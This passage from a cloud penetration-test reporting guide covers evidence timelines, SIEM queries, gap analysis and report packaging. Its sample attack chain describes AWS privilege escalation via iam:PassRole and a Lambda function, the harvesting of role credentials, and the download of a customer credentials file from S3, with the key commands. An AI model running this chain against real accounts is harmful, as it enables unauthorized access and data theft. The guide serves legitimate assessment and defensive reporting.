        writer = csv.DictWriter(f, fieldnames=['timestamp', 'action', 'source', 'type', 'user'])
        writer.writeheader()
        writer.writerows(timeline)

if __name__ == '__main__':
    evidence_dir = 'evidence-20251015-130000'
    timeline = parse_logs(evidence_dir)
    export_timeline(timeline, f'{evidence_dir}/complete-timeline.csv')
    print(f'[+] Timeline exported: {evidence_dir}/complete-timeline.csv')
    print(f'[+] Total events: {len(timeline)}')
```

### Visual Timeline

**Generate timeline visualization:**

```python
#!/usr/bin/env python3
# visualize-timeline.py

import matplotlib.pyplot as plt
import matplotlib.dates as mdates
import pandas as pd
from datetime import datetime

# Read timeline CSV
df = pd.read_csv('evidence/complete-timeline.csv')
df['timestamp'] = pd.to_datetime(df['timestamp'])

# Create figure
fig, ax = plt.subplots(figsize=(15, 8))

# Define phase colors
phase_colors = {
    'reconnaissance': '#3498db',
    'enumeration': '#2ecc71',
    'analysis': '#f39c12',
    'exploitation': '#e74c3c',
    'post-exploit': '#9b59b6'
}

# Plot events
for phase, color in phase_colors.items():
    phase_events = df[df['phase'] == phase]
    ax.scatter(phase_events['timestamp'], [phase]*len(phase_events), 
               c=color, label=phase.capitalize(), s=100, alpha=0.7)

# Format
ax.set_xlabel('Time (UTC)', fontsize=12)
ax.set_ylabel('Assessment Phase', fontsize=12)
ax.set_title('CTF Assessment Timeline', fontsize=14, fontweight='bold')
ax.legend(loc='upper right')
ax.grid(True, alpha=0.3)

# Format x-axis
ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M:%S'))
plt.xticks(rotation=45)

plt.tight_layout()
plt.savefig('evidence/timeline-visual.png', dpi=300)
print('[+] Timeline visualization saved: evidence/timeline-visual.png')
```

### Attack Chain Documentation

**Narrative timeline for exploitation chain:**

```markdown
# Attack Chain: Privilege Escalation to S3 Data Exfiltration

## Phase 1: Initial Access (13:00 - 13:30 UTC)
**13:00:00** - Received limited IAM user credentials (ReadOnlyAccess policy)
**13:15:32** - Verified access: `aws sts get-caller-identity`
  - User: arn:aws:iam::123456789012:user/pentester
  - Evidence: evidence/001-reconnaissance/identity.json

**13:22:18** - Enumerated IAM users and roles
  - Command: `aws iam list-users && aws iam list-roles`
  - Discovered 47 users, 23 roles
  - Evidence: evidence/002-iam-analysis/users.json

## Phase 2: Vulnerability Identification (13:30 - 14:30 UTC)
**14:05:43** - Executed automated analysis with ScoutSuite
  - Identified overprivileged role "WebAppRole" with s3:* permissions
  - Trust policy allows assumption from EC2 service
  - Evidence: evidence/002-iam-analysis/scoutsuite-report.html

**14:18:29** - Analyzed WebAppRole trust policy
  - Command: `aws iam get-role --role-name WebAppRole`
  - No MFA or ExternalId requirement identified
  - Evidence: evidence/002-iam-analysis/role-policies/WebAppRole.json

**14:25:16** - Identified pentester user has iam:PassRole permission
  - Allows passing WebAppRole to Lambda functions
  - Evidence: evidence/002-iam-analysis/pentester-policies.json

## Phase 3: Exploitation (14:30 - 15:00 UTC)
**14:32:18** - Created Lambda function with WebAppRole
  - Command: `aws lambda create-function --function-name exploit-func --role arn:aws:iam::123456789012:role/WebAppRole`
  - Function created successfully
  - Evidence: evidence/004-exploitation/lambda-creation.log

**14:38:45** - Invoked Lambda function to retrieve role credentials
  - Function accessed IMDS and returned temporary credentials
  - Evidence: evidence/004-exploitation/credential-harvest.json

**14:45:55** - Configured AWS CLI with harvested credentials
  - Successfully authenticated as WebAppRole
  - Enumerated S3 buckets: 15 buckets accessible
  - Evidence: evidence/004-exploitation/s3-list.txt

## Phase 4: Post-Exploitation (15:00 - 15:30 UTC)
**15:12:07** - Accessed sensitive S3 bucket: customer-pii-backup
  - Command: `aws s3 ls s3://customer-pii-backup/`
  - Identified sensitive files: customer_database_backup.sql, user_credentials.csv
  - Evidence: evidence/004-exploitation/sensitive-bucket-contents.txt

**15:18:33** - Downloaded proof-of-concept data
  - Command: `aws s3 cp s3://customer-pii-backup/user_credentials.csv ./`
  - Download successful: 2.4 MB, ~500,000 records
  - Evidence: evidence/005-post-exploitation/poc-download.log

**15:30:00** - Terminated access and cleaned up test resources
  - Deleted Lambda function
  - Cleared temporary credentials
  - Evidence: evidence/005-post-exploitation/cleanup.log

## Summary
**Total Duration**: 2.5 hours (13:00 - 15:30 UTC)
**Access Path**: Limited IAM user → iam:PassRole → Lambda with overprivileged role → S3 data access
**Critical Vulnerability**: IAM role with wildcard S3 permissions and no assumption restrictions
**Impact**: Full read/write/delete access to all S3 buckets including sensitive customer data
```

### Correlation with Defensive Logs

**Identify detection opportunities:**

```markdown
# Timeline: Attack vs. Detection Opportunities

| Attacker Action (Time) | Expected Log Source | Detection Signature | Detected? |
|------------------------|---------------------|---------------------|-----------|
| AssumeRole to WebAppRole (14:32:18) | CloudTrail | Unusual principal assuming role | [Unverified] |
| S3 ListBuckets from Lambda (14:45:55) | CloudTrail, S3 Access Logs | Lambda function accessing multiple buckets | [Unverified] |
| S3 GetObject on sensitive bucket (15:12:07) | S3 Access Logs, GuardDuty | Access to sensitive bucket from new source | [Unverified] |
| Large data transfer (15:18:33) | VPC Flow Logs, CloudWatch | Unusual egress volume | [Unverified] |

**Recommendation for Blue Team:**
- Enable GuardDuty for IAM and S3 anomaly detection
- Configure CloudWatch alarms for AssumeRole events on sensitive roles
- Implement S3 access logging with automated analysis
- Set data exfiltration alerts based on egress volume thresholds
```

### Timeline Best Practices

**Timestamp synchronization:**

```bash
# Ensure all systems use UTC
timedatectl set-timezone UTC

# Verify time sync
timedatectl status

# Add timestamp to every command in bash history
export HISTTIMEFORMAT="%F %T "
history
```

**Continuous timeline logging:**

```bash
# Real-time timeline append function
log_action() {
  echo "$(date -u +%Y-%m-%dT%H:%M:%SZ),$1,$2,$3" >> evidence/timeline-live.csv
}

# Usage during testing
log_action "Enumeration" "List IAM users" "aws iam list-users"
aws iam list-users > evidence/users.json
log_action "Enumeration" "IAM users retrieved" "47 users found"
```

### Important Timeline Considerations

[Unverified] CloudTrail events may experience delays of up to 15 minutes before appearing in logs. When correlating your timeline with CloudTrail, account for potential lag between action execution and log availability.

**Timeline verification:**

```bash
# Compare local timestamps with CloudTrail
# Check for discrepancies that might indicate:
# - Clock synchronization issues
# - Event processing delays
# - Missing events due to service throttling

# Extract local action timestamps
grep "AssumeRole" evidence/logs/*.log | cut -d'[' -f2 | cut -d']' -f1

# Compare with CloudTrail event time
jq '.Events[] | select(.EventName=="AssumeRole") | .EventTime' cloudtrail-raw.json

# Document any gaps
```

### Timeline Integration in Report

**Placement within report:** The complete timeline should appear as an appendix, but key sequences should be referenced directly in finding descriptions.

**Example integration:**

```markdown
## Finding F-001: Privilege Escalation via Lambda PassRole

[...description and technical details...]

### Exploitation Timeline
The following sequence demonstrates the exploitation path from initial access 
to sensitive data retrieval:

14:32:18 UTC - Created Lambda function with overprivileged WebAppRole
14:38:45 UTC - Harvested role credentials via function execution
14:45:55 UTC - Enumerated S3 buckets using elevated permissions
15:12:07 UTC - Accessed customer-pii-backup bucket
15:18:33 UTC - Downloaded sensitive customer data

(See Appendix C: Complete Assessment Timeline for full chronological record)

[...impact and remediation...]
```

### Third-Party Tool Timeline Export

**Export ScoutSuite findings with timestamps:**

```bash
# ScoutSuite doesn't include native timestamps
# Add them manually when running
echo "Scan started: $(date -u +%Y-%m-%dT%H:%M:%SZ)" > evidence/scoutsuite-timeline.txt
scout aws --profile pentest
echo "Scan completed: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/scoutsuite-timeline.txt

# Parse results for timeline integration
jq -r '.services[] | .findings[] | .flagged_items' \
  scoutsuite-report/scoutsuite-results/scoutsuite_results_*.js > evidence/findings-list.txt
```

**Prowler timeline integration:**

```bash
# Prowler includes timestamps in CSV output
prowler aws -M csv

# Extract timeline data
cat output/prowler-output-*.csv | cut -d',' -f1,3,4,6,8 > evidence/prowler-timeline.csv

# Format: TIMESTAMP,CHECK_ID,STATUS,REGION,RESOURCE_ID
```

### Cloud-Native Logging Integration

**AWS CloudTrail querying for timeline:**

```bash
# Query specific time range
aws cloudtrail lookup-events \
  --start-time 2025-10-15T13:00:00Z \
  --end-time 2025-10-15T16:00:00Z \
  --lookup-attributes AttributeKey=Username,AttributeValue=pentester \
  --output json > evidence/cloudtrail-pentest-window.json

# Extract critical events
jq '.Events[] | select(.EventName | 
  test("AssumeRole|PassRole|CreateFunction|PutObject|GetObject"))' \
  evidence/cloudtrail-pentest-window.json > evidence/critical-events.json

# Generate CSV timeline
jq -r '.Events[] | [
  .EventTime,
  .EventName,
  .EventSource,
  .Username,
  (.Resources[]?.ResourceName // "N/A")
] | @csv' evidence/cloudtrail-pentest-window.json > evidence/cloudtrail-timeline.csv
```

**Azure Activity Log timeline:**

```bash
# Query Azure activity logs
az monitor activity-log list \
  --start-time 2025-10-15T13:00:00Z \
  --end-time 2025-10-15T16:00:00Z \
  --query "[?caller=='pentester@company.com']" \
  --output json > evidence/azure-activity.json

# Extract timeline
jq -r '.[] | [
  .eventTimestamp,
  .operationName.value,
  .caller,
  .resourceId,
  .status.value
] | @csv' evidence/azure-activity.json > evidence/azure-timeline.csv
```

**GCP Cloud Audit Logs timeline:**

```bash
# Query Cloud Logging
gcloud logging read \
  "protoPayload.authenticationInfo.principalEmail=pentester@project.iam.gserviceaccount.com" \
  --format json \
  --project <project-id> \
  > evidence/gcp-audit.json

# Extract timeline
jq -r '.[] | [
  .timestamp,
  .protoPayload.methodName,
  .protoPayload.authenticationInfo.principalEmail,
  .resource.type,
  .protoPayload.status.code
] | @csv' evidence/gcp-audit.json > evidence/gcp-timeline.csv
```

### Incident Response Timeline Correlation

**Format for IR team:**

````markdown
# Incident Response Timeline Correlation

## Assessment Window
- **Start**: 2025-10-15 13:00:00 UTC
- **End**: 2025-10-15 15:30:00 UTC
- **Duration**: 2.5 hours
- **Source IP**: 203.0.113.45 (pentest workstation)

## Key Events for SIEM Correlation

### Event 1: Initial Access
- **Time**: 2025-10-15 13:00:00 UTC
- **User**: pentester@company.com
- **Action**: Authentication success
- **Source**: AWS Console / API
- **Signature**: Successful authentication from new IP

### Event 2: Enumeration Activity
- **Time**: 2025-10-15 13:15:00 - 14:00:00 UTC
- **User**: pentester
- **Actions**: Multiple IAM list-* API calls
- **Volume**: 50+ API calls in 45 minutes
- **Signature**: Rapid enumeration pattern

### Event 3: Privilege Escalation
- **Time**: 2025-10-15 14:32:18 UTC
- **User**: pentester
- **Action**: Lambda CreateFunction with WebAppRole
- **Signature**: PassRole to Lambda with elevated permissions

### Event 4: Credential Harvesting
- **Time**: 2025-10-15 14:38:45 UTC
- **User**: N/A (Lambda execution role)
- **Action**: AssumeRole via Lambda
- **Signature**: Role assumption from Lambda service

### Event 5: Unauthorized Data Access
- **Time**: 2025-10-15 15:12:07 - 15:18:33 UTC
- **User**: WebAppRole (via Lambda)
- **Actions**: S3 ListBucket, GetObject on customer-pii-backup
- **Volume**: 2.4 MB downloaded
- **Signature**: Sensitive bucket access from unexpected principal

## SIEM Query Examples

**Splunk:**
```spl
index=cloudtrail earliest="10/15/2025:13:00:00" latest="10/15/2025:15:30:00"
| where userIdentity.principalId="pentester" OR 
        userIdentity.sessionContext.sessionIssuer.userName="WebAppRole"
| table eventTime, eventName, sourceIPAddress, userIdentity.principalId, requestParameters
| sort eventTime
````

**Elastic:**

```json
{
  "query": {
    "bool": {
      "must": [
        {
          "range": {
            "@timestamp": {
              "gte": "2025-10-15T13:00:00Z",
              "lte": "2025-10-15T15:30:00Z"
            }
          }
        },
        {
          "terms": {
            "userIdentity.principalId": ["pentester", "AROA...:WebAppRole"]
          }
        }
      ]
    }
  }
}
```

**Azure Sentinel (KQL):**

```kql
AzureActivity
| where TimeGenerated between (datetime(2025-10-15T13:00:00Z) .. datetime(2025-10-15T15:30:00Z))
| where Caller == "pentester@company.com"
| project TimeGenerated, OperationNameValue, Caller, ResourceId, ActivityStatusValue
| order by TimeGenerated asc
```

````

### Gap Analysis Documentation

**Identify and document timeline gaps:**
```markdown
## Timeline Gap Analysis

### Known Gaps

**Gap 1: Missing IMDS Access Logs**
- **Time Range**: 14:38:00 - 14:39:00 UTC
- **Context**: Lambda function accessed instance metadata
- **Issue**: IMDS access is not logged in CloudTrail by default
- **Evidence**: Inferred from Lambda execution logs and credential harvest success
- **Impact**: Cannot precisely timestamp credential extraction
- **Recommendation**: Enable VPC Flow Logs for Lambda functions

**Gap 2: CloudTrail Processing Delay**
- **Local Time**: 14:32:18 UTC (Lambda CreateFunction)
- **CloudTrail Time**: 14:32:18 UTC (logged)
- **Appearance Time**: 14:45:32 UTC (first query retrieval)
- **Delay**: 13 minutes, 14 seconds
- **Note**: Events occurred but were not queryable immediately

**Gap 3: S3 Access Log Delivery Lag**
- **Action Time**: 15:12:07 UTC (GetObject request)
- **Log Availability**: 15:45:00 UTC (estimated)
- **Delay**: ~33 minutes
- **Source**: S3 server access logs deliver on best-effort basis
- **Impact**: Real-time detection not possible via access logs alone

### Timeline Reconstruction Methods

For gaps where direct evidence is unavailable:
1. **Inference from subsequent events**: [Inference] Credential harvest must have occurred between Lambda creation (14:32:18) and first use of harvested credentials (14:45:55)
2. **Correlation with application logs**: Check Lambda CloudWatch Logs for execution timestamps
3. **Network flow analysis**: Review VPC Flow Logs for traffic patterns
````

### Long-Running Assessment Timeline

**Multi-day assessment tracking:**

```bash
# Create daily timeline files
date_stamp=$(date +%Y%m%d)
echo "Assessment Day $(date +%A), $(date +%F)" > evidence/timeline-day-$date_stamp.md

# Append to master timeline
cat evidence/timeline-day-*.md > evidence/timeline-complete.md

# Create daily summary
cat << EOF >> evidence/timeline-day-$date_stamp.md
## Day Summary

**Date**: $(date +%Y-%m-%d)
**Hours Active**: 8.5
**Findings Discovered**: 7 (3 Critical, 2 High, 2 Medium)
**New Access Obtained**: IAM role "WebAppRole", EC2 instance shell access
**Recommendations Generated**: 12

### Key Milestones
- 09:30 - Identified privilege escalation path via PassRole
- 14:32 - Successfully escalated to WebAppRole
- 15:12 - Accessed sensitive S3 data (proof-of-concept)
- 16:45 - Documented findings F-001 through F-003

### Next Steps for Tomorrow
- Test lateral movement to RDS instances
- Enumerate Lambda functions for additional credential sources
- Review CloudFormation templates for hardcoded secrets
EOF
```

### Timeline Validation Checklist

Before finalizing the report, verify:

**Completeness:**

- [ ] All significant actions have timestamps
- [ ] CloudTrail events retrieved for assessment window
- [ ] Local command logs include timestamps
- [ ] Screenshots contain visible timestamps
- [ ] Evidence files have creation timestamps

**Accuracy:**

- [ ] All timestamps in UTC
- [ ] Clock synchronization verified across systems
- [ ] CloudTrail processing delays documented
- [ ] Time zone conversions verified if needed
- [ ] Timestamp format consistent throughout

**Correlation:**

- [ ] Local timeline matches cloud provider logs
- [ ] Gaps identified and explained
- [ ] Critical event sequences verified
- [ ] Cross-referenced with evidence files
- [ ] Attack chain timeline complete

**Documentation:**

- [ ] Timeline exported in multiple formats (CSV, MD, visual)
- [ ] Key sequences highlighted in findings
- [ ] Complete timeline in appendix
- [ ] SIEM correlation queries provided
- [ ] IR handoff documentation prepared

### Timeline Export Formats

**CSV format for spreadsheet analysis:**

```csv
Timestamp,Phase,Action,Tool,User/Principal,Resource,Result,Evidence_File
2025-10-15T13:00:00Z,Reconnaissance,Initial authentication,AWS Console,pentester,N/A,Success,screenshots/001-login.png
2025-10-15T13:15:32Z,Reconnaissance,Identity verification,aws-cli,pentester,arn:aws:iam::123456789012:user/pentester,Success,logs/identity.json
2025-10-15T13:22:18Z,Enumeration,User enumeration,aws-cli,pentester,IAM,47 users discovered,json/users.json
```

**Markdown format for documentation:**

```markdown
# Assessment Timeline

## 2025-10-15

### Reconnaissance Phase (13:00 - 13:30 UTC)

**13:00:00** - Initial authentication via AWS Console  
*User*: pentester  
*Result*: Success  
*Evidence*: screenshots/001-login.png

**13:15:32** - Identity verification  
*Command*: `aws sts get-caller-identity`  
*Principal*: arn:aws:iam::123456789012:user/pentester  
*Evidence*: logs/identity.json
```

**JSON format for programmatic analysis:**

```json
{
  "assessment_id": "ASSESS-2025-10-15",
  "timeline": [
    {
      "timestamp": "2025-10-15T13:00:00Z",
      "phase": "reconnaissance",
      "action": "initial_authentication",
      "tool": "aws_console",
      "principal": "pentester",
      "result": "success",
      "evidence": ["screenshots/001-login.png"]
    },
    {
      "timestamp": "2025-10-15T13:15:32Z",
      "phase": "reconnaissance",
      "action": "identity_verification",
      "tool": "aws-cli",
      "command": "aws sts get-caller-identity",
      "principal": "arn:aws:iam::123456789012:user/pentester",
      "result": "success",
      "evidence": ["logs/identity.json"]
    }
  ]
}
```

### Automated Report Generation

**Compile evidence into structured report:**

```python
#!/usr/bin/env python3
# generate-report.py

import json
import csv
from datetime import datetime
from pathlib import Path
import jinja2

def load_timeline(timeline_file):
    """Load timeline from CSV"""
    timeline = []
    with open(timeline_file, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            timeline.append(row)
    return timeline

def load_findings(findings_dir):
    """Load all findings from JSON files"""
    findings = []
    for finding_file in Path(findings_dir).glob('*.json'):
        with open(finding_file, 'r') as f:
            findings.append(json.load(f))
    return sorted(findings, key=lambda x: x['severity_score'], reverse=True)

def load_evidence_inventory(evidence_dir):
    """Generate evidence inventory with file hashes"""
    inventory = []
    for evidence_file in Path(evidence_dir).rglob('*'):
        if evidence_file.is_file():
            import hashlib
            with open(evidence_file, 'rb') as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            inventory.append({
                'path': str(evidence_file),
                'size': evidence_file.stat().st_size,
                'modified': datetime.fromtimestamp(evidence_file.stat().st_mtime).isoformat(),
                'hash': file_hash
            })
    return inventory

def generate_report(template_file, output_file, context):
    """Generate report from Jinja2 template"""
    env = jinja2.Environment(loader=jinja2.FileSystemLoader('.'))
    template = env.get_template(template_file)
    
    with open(output_file, 'w') as f:
        f.write(template.render(context))
    
    print(f'[+] Report generated: {output_file}')

if __name__ == '__main__':
    # Load data
    timeline = load_timeline('evidence/timeline-complete.csv')
    findings = load_findings('findings/')
    evidence = load_evidence_inventory('evidence/')
    
    # Prepare context
    context = {
        'report_date': datetime.now().isoformat(),
        'assessment_period': {
            'start': '2025-10-15T13:00:00Z',
            'end': '2025-10-15T15:30:00Z'
        },
        'timeline': timeline,
        'findings': findings,
        'evidence_inventory': evidence,
        'statistics': {
            'total_findings': len(findings),
            'critical': len([f for f in findings if f['severity'] == 'Critical']),
            'high': len([f for f in findings if f['severity'] == 'High']),
            'medium': len([f for f in findings if f['severity'] == 'Medium']),
            'low': len([f for f in findings if f['severity'] == 'Low']),
            'total_evidence_files': len(evidence)
        }
    }
    
    # Generate reports in multiple formats
    generate_report('templates/report-template.md', 'final-report.md', context)
    generate_report('templates/report-template.html', 'final-report.html', context)
    
    print(f'[+] Report generation complete')
    print(f'[+] Total findings: {context["statistics"]["total_findings"]}')
    print(f'[+] Evidence files: {context["statistics"]["total_evidence_files"]}')
```

### Report Delivery Package

**Final deliverable structure:**

```
CTF-Assessment-Report-20251015/
├── Executive-Summary.pdf
├── Technical-Report.pdf
├── Technical-Report.md
├── Technical-Report.html
├── findings/
│   ├── F-001-IAM-Privilege-Escalation.pdf
│   ├── F-002-S3-Data-Exposure.pdf
│   └── [...additional findings...]
├── evidence/
│   ├── 001-reconnaissance/
│   ├── 002-iam-analysis/
│   ├── 003-s3-enumeration/
│   ├── 004-exploitation/
│   ├── 005-post-exploitation/
│   └── evidence-hashes.txt
├── timeline/
│   ├── complete-timeline.csv
│   ├── complete-timeline.md
│   ├── timeline-visual.png
│   └── attack-chain.md
├── remediation/
│   ├── quick-wins.md
│   ├── detailed-remediation-guide.pdf
│   └── terraform-fixes/
│       ├── iam-policies.tf
│       └── s3-bucket-policies.tf
├── tools-and-scripts/
│   ├── enumeration-script.sh
│   ├── evidence-collector.sh
│   └── requirements.txt
└── metadata/
    ├── scope-definition.txt
    ├── tool-versions.txt
    ├── assessment-team.txt
    └── chain-of-custody.yaml
```

### Quality Assurance Review

**Pre-delivery checklist:**

```markdown
# Report QA Checklist

## Content Review
- [ ] All findings have unique IDs
- [ ] Severity ratings consistent and justified (CVSS scores documented)
- [ ] Each finding includes: description, technical details, PoC, impact, remediation
- [ ] No placeholder text or TODOs remaining
- [ ] All technical commands verified for accuracy
- [ ] Screenshots clearly show relevant information
- [ ] No sensitive data (real passwords, keys) in report or evidence

## Evidence Verification
- [ ] All referenced evidence files exist
- [ ] Evidence hashes generated and verified
- [ ] File paths in report match actual evidence structure
- [ ] Screenshots contain timestamps
- [ ] Log files include full command output
- [ ] Chain of custody documentation complete

## Timeline Accuracy
- [ ] All timestamps in UTC
- [ ] Timeline events correlate with evidence files
- [ ] Gaps identified and explained
- [ ] Attack chain sequence verified
- [ ] CloudTrail events included where available

## Technical Accuracy
- [ ] All commands tested and verified
- [ ] ARNs, IDs, and identifiers consistent throughout
- [ ] No speculation presented as fact (proper labeling: [Inference], [Unverified])
- [ ] Tool versions documented
- [ ] Remediation steps technically sound

## Formatting and Presentation
- [ ] Consistent heading styles
- [ ] Tables properly formatted
- [ ] Code blocks use syntax highlighting
- [ ] Bullet points and numbered lists used appropriately
- [ ] Page breaks in appropriate locations (PDF)
- [ ] Table of contents generated and accurate

## Deliverables Completeness
- [ ] Executive summary (non-technical)
- [ ] Technical report (detailed)
- [ ] Individual finding documents
- [ ] Complete evidence package
- [ ] Timeline documentation
- [ ] Remediation guide
- [ ] Tools and scripts used

## Legal and Compliance
- [ ] Scope clearly defined and adhered to
- [ ] No unauthorized testing documented
- [ ] Client data handling compliant with agreement
- [ ] Confidentiality maintained
- [ ] Appropriate disclaimers included
```

---

## Key Documentation Principles

### Reproducibility

Every finding must be reproducible by a third party using the provided evidence and commands. Test your PoC steps before finalizing.

### Objectivity

Present facts supported by evidence. Use [Inference] and [Unverified] labels appropriately. Avoid speculation.

### Clarity

Write for your audience. Technical details for engineers, business impact for executives. Use clear language and avoid jargon where possible.

### Completeness

Document everything during testing. It's easier to remove excess detail than to reconstruct events later.

### Accuracy

Verify all commands, paths, identifiers, and timestamps. Errors undermine credibility.

---

## Related Topics

For deeper expertise in adjacent areas, consider exploring:

- **Cloud Security Architecture Review**: Systematic evaluation of cloud designs against security frameworks (CIS, NIST)
- **Automated Security Reporting Tools**: Integration of findings into SIEM, ticketing systems, and vulnerability management platforms
- **Compliance Mapping**: Aligning security findings with regulatory requirements (SOC 2, ISO 27001, PCI DSS, GDPR)
- **Remediation Verification Testing**: Follow-up assessments to confirm vulnerability fixes and validate security improvements

---

